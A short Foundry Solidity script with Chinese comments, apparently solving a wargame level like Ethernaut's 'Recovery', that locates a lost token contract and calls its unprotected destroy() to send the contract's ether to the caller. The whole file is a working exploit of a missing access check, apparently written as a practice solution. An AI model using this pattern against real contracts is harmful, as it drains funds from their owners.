// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryAttackScript is Script {
    function run() external {
        // SimpleToken 地址：从 Etherscan 的 Internal Txns 找到
        // （也可以用 keccak256(rlp([recoveryLevel, 1])) 链下算出来）
        address lostToken = 0xAf9050402e3bEe84CA771dd74e0A4c9645798fD5;

        console.log("SimpleToken balance(wei):", lostToken.balance);

        vm.startBroadcast();

        // 调用 destroy 把 ether 转给自己（destroy 没做权限校验）
        ISimpleToken(lostToken).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }
}
